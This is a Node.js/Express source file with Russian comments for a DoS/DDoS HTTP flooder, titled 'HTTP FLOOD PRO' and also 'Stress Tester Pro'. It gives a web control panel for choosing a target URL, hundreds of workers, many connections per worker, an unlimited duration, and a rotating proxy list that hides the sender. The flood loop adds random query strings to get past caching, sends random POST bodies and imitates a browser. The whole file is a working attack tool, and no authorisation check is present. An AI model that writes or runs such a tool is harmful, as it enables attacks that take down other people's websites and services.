// Усиленный HTTP-флудер с поддержкой прокси и нативными соединениями
const express = require('express');
const http = require('http');
const https = require('https');
const url = require('url');
const { HttpProxyAgent } = require('http-proxy-agent');
const { HttpsProxyAgent } = require('https-proxy-agent');

const app = express();
app.use(express.json());

// Глобальное состояние
let attackActive = false;
let stopFlag = false;
let stats = {
  totalRequests: 0,
  success: 0,
  failed: 0,
  bytesSent: 0,
  active: false
};
let proxyList = []; // массив прокси в формате http://host:port
let currentProxyIndex = 0;

// Генерация случайной строки
function randomString(length) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

// Создание агента для запросов с учётом прокси
function getAgent(targetUrl) {
  if (proxyList.length > 0) {
    // Циклический выбор прокси
    const proxy = proxyList[currentProxyIndex % proxyList.length];
    currentProxyIndex++;
    const isHttps = targetUrl.startsWith('https');
    if (isHttps) {
      return new HttpsProxyAgent(proxy);
    } else {
      return new HttpProxyAgent(proxy);
    }
  }
  return undefined; // без прокси
}

// Основной рабочий поток: создаёт непрерывный поток HTTP-запросов с высокой конкуренцией
function floodWorker(target, mode, connectionsPerWorker) {
  const parsed = url.parse(target);
  const isHttps = parsed.protocol === 'https:';
  const transport = isHttps ? https : http;
  
  // Параметры запроса
  const requestOptions = {
    hostname: parsed.hostname,
    port: parsed.port || (isHttps ? 443 : 80),
    path: parsed.path || '/',
    method: 'GET',
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Accept': '*/*',
      'Connection': 'keep-alive'
    }
  };
  
  // Функция отправки одного запроса без ожидания ответа (огонь и забыл для максимальной скорости)
  function fireRequest() {
    // Добавляем случайный параметр, чтобы обойти кэш
    const randPath = `${requestOptions.path}?${randomString(4)}=${Math.floor(Math.random()*10000)}`;
    const options = { ...requestOptions, path: randPath, agent: getAgent(target) };
    
    const req = transport.request(options, (res) => {
      // Собираем тело ответа для подсчёта трафика
      res.on('data', (chunk) => {
        stats.bytesSent += chunk.length;
      });
      res.on('end', () => {
        stats.totalRequests++;
        if (res.statusCode < 400) {
          stats.success++;
        } else {
          stats.failed++;
        }
      });
    });
    
    req.on('error', (err) => {
      stats.totalRequests++;
      stats.failed++;
    });
    
    // Для POST-запросов иногда отправляем тело
    if (Math.random() < 0.3) {
      const payload = JSON.stringify({ data: randomString(1024) });
      req.setHeader('Content-Type', 'application/json');
      req.setHeader('Content-Length', Buffer.byteLength(payload));
      req.write(payload);
    }
    
    req.end();
  }
  
  // В каждом воркере запускаем указанное количество параллельных "подпотоков" запросов
  let stopped = false;
  const localStop = () => { stopped = true; };
  
  // Создаём connectionsPerWorker функций, которые в цикле шлют запросы с микро-задержкой в dos-режиме
  const loop = () => {
    if (stopped || stopFlag) return;
    fireRequest();
    if (mode === 'dos') {
      setTimeout(loop, Math.floor(Math.random() * 5) + 1); // 1-5 мс задержка
    } else {
      // DDoS режим: немедленный следующий запрос (setImmediate для избежания блокировки)
      setImmediate(loop);
    }
  };
  
  // Запускаем несколько параллельных циклов в одном воркере
  for (let i = 0; i < connectionsPerWorker; i++) {
    loop();
  }
  
  return localStop;
}

// Запуск атаки
function startAttack(target, threads, mode, duration, proxies, conPerWorker) {
  if (attackActive) return { success: false, message: 'Атака уже активна' };
  
  // Установка прокси, если переданы
  if (proxies && proxies.trim()) {
    proxyList = proxies.split('\n').map(p => p.trim()).filter(p => p.length > 0);
    currentProxyIndex = 0;
  } else {
    proxyList = [];
  }
  
  stats = { totalRequests: 0, success: 0, failed: 0, bytesSent: 0, active: true };
  attackActive = true;
  stopFlag = false;
  
  const localStopFns = [];
  
  // Каждый высокоуровневый поток создаёт внутренние конкурентные соединения
  for (let i = 0; i < threads; i++) {
    const stopFn = floodWorker(target, mode, conPerWorker || 10);
    localStopFns.push(stopFn);
  }
  
  if (duration > 0) {
    setTimeout(() => {
      stopFlag = true;
      attackActive = false;
      stats.active = false;
    }, duration * 1000);
  }
  
  return { success: true, message: `Запущено ${threads} потоков по ${conPerWorker||10} соединений, режим ${mode.toUpperCase()}` };
}

function stopAttack() {
  if (!attackActive) return { success: false, message: 'Нет активной атаки' };
  stopFlag = true;
  attackActive = false;
  stats.active = false;
  return { success: true, message: 'Атака остановлена' };
}

// Веб-интерфейс
app.get('/', (req, res) => {
  const html = `
<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Stress Tester Pro</title>
<style>
  body { background:#0a0a0a; color:#0f0; font-family:'Courier New',monospace; padding:20px; }
  .container { max-width:800px; margin:0 auto; }
  h1 { text-align:center; text-shadow:0 0 10px #0f0; }
  .form-group { margin-bottom:15px; }
  label { display:block; margin-bottom:5px; }
  input, select, textarea, button { background:#1a1a1a; color:#0f0; border:1px solid #0f0; padding:8px 12px; font-family:inherit; }
  input[type="text"], input[type="number"], textarea { width:100%; }
  button { cursor:pointer; margin-right:10px; }
  button:hover { background:#0f0; color:#000; }
  button:disabled { opacity:0.5; cursor:not-allowed; }
  .stats { border:1px solid #0f0; padding:15px; margin-top:20px; }
  .stats span { font-weight:bold; }
  .slider-container { display:flex; align-items:center; }
  input[type="range"] { flex:1; margin-right:10px; }
  textarea { height:80px; }
</style>
</head>
<body>
<div class="container">
  <h1>⚡ HTTP FLOOD PRO ⚡</h1>
  <div class="form-group">
    <label>Целевой URL</label>
    <input type="text" id="target" value="http://example.com" placeholder="http://...">
  </div>
  <div class="form-group">
    <label>Потоков (воркеров)</label>
    <div class="slider-container">
      <input type="range" id="threadsSlider" min="10" max="500" value="100" oninput="document.getElementById('threadsVal').textContent=this.value">
      <span id="threadsVal">100</span>
    </div>
  </div>
  <div class="form-group">
    <label>Соединений на воркер (усиление)</label>
    <div class="slider-container">
      <input type="range" id="connPerWorker" min="1" max="50" value="10" oninput="document.getElementById('connVal').textContent=this.value">
      <span id="connVal">10</span>
    </div>
    <small>Общее число одновременных соединений = потоки × это значение</small>
  </div>
  <div class="form-group">
    <label>Режим</label>
    <select id="mode">
      <option value="dos">DoS (умеренный, 1-5 мс задержка)</option>
      <option value="ddos">DDoS (максимальный, без задержки)</option>
    </select>
  </div>
  <div class="form-group">
    <label>Длительность (сек, 0=бесконечно)</label>
    <input type="number" id="duration" value="0" min="0">
  </div>
  <div class="form-group">
    <label>Прокси (по одному на строку, http://ip:port)</label>
    <textarea id="proxies" placeholder="http://1.2.3.4:8080
http://5.6.7.8:3128"></textarea>
  </div>
  <div>
    <button id="startBtn" onclick="start()">ЗАПУСТИТЬ</button>
    <button id="stopBtn" onclick="stop()" disabled>СТОП</button>
  </div>
  <div class="stats">
    <p>Запросов: <span id="req">0</span> | Успешно: <span id="suc">0</span> | Ошибок: <span id="err">0</span></p>
    <p>Трафик: <span id="bytes">0</span> байт | Статус: <span id="status">Ожидание</span></p>
  </div>
</div>
<script>
  function start() {
    fetch('/api/start', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        target: document.getElementById('target').value,
        threads: parseInt(document.getElementById('threadsSlider').value),
        conPerWorker: parseInt(document.getElementById('connPerWorker').value),
        mode: document.getElementById('mode').value,
        duration: parseInt(document.getElementById('duration').value),
        proxies: document.getElementById('proxies').value
      })
    })
    .then(r => r.json())
    .then(d => {
      if (d.status === 'ok') {
        document.getElementById('startBtn').disabled = true;
        document.getElementById('stopBtn').disabled = false;
      } else {
        alert(d.message);
      }
    });
  }
  function stop() {
    fetch('/api/stop')
    .then(r => r.json())
    .then(d => {
      if (d.status === 'ok') {
        document.getElementById('startBtn').disabled = false;
        document.getElementById('stopBtn').disabled = true;
      }
    });
  }
  setInterval(() => {
    fetch('/api/stats')
    .then(r => r.json())
    .then(s => {
      document.getElementById('req').textContent = s.totalRequests;
      document.getElementById('suc').textContent = s.success;
      document.getElementById('err').textContent = s.failed;
      document.getElementById('bytes').textContent = s.bytesSent;
      document.getElementById('status').textContent = s.active ? 'АКТИВНА' : 'Остановлена';
    });
  }, 1000);
</script>
</body>
</html>`;
  res.send(html);
});

app.post('/api/start', (req, res) => {
  const { target, threads, mode, duration, proxies, conPerWorker } = req.body;
  if (!target || !target.startsWith('http')) {
    return res.json({ status: 'error', message: 'Некорректный URL' });
  }
  const result = startAttack(target, parseInt(threads) || 100, mode || 'ddos', parseInt(duration) || 0, proxies, parseInt(conPerWorker) || 10);
  res.json({ status: result.success ? 'ok' : 'error', message: result.message });
});

app.get('/api/stop', (req, res) => {
  const result = stopAttack();
  res.json({ status: result.success ? 'ok' : 'error', message: result.message });
});

app.get('/api/stats', (req, res) => {
  res.json(stats);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Stress tester PRO running on port ${PORT}`);
});
